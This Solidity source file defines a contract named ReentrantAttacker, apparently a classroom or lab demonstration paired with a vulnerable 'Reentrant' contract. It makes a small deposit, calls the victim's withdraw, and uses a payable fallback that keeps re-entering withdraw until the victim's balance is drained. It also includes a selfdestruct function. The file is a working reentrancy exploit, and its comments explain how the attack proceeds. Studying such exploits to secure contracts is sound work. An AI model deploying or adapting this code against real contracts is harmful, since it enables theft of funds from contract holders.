pragma solidity ^0.4.18;
import "./Reentrant.sol";

contract ReentrantAttacker {
    Reentrant public victim;

    function ReentrantAttacker(address _address) public {
        victim = Reentrant(_address);
    }

    function kill() public {
        selfdestruct(msg.sender);
    }
/*
    function getMyBalance() public view returns (uint) {
        return victim.getBalance(this);
    }

    function putMyBalance(uint _amount) public {
        victim.addToSender(_amount);
    }
*/
    function attack() public payable {
        victim.deposit.value(msg.value)(); // sender/attacker can deposit a small amount
        victim.withdraw(); // victim's withdraw function is not re-entrant safe
                           // below fallback will be invoked
    }

    function () public payable {
        // keep calling victim's withdraw, 
        // this fallback will be recursively called 
        // until victim's balance has less than attacking deposit amount.
        if (victim.balance >= msg.value) {
            victim.withdraw();
        }
    }
}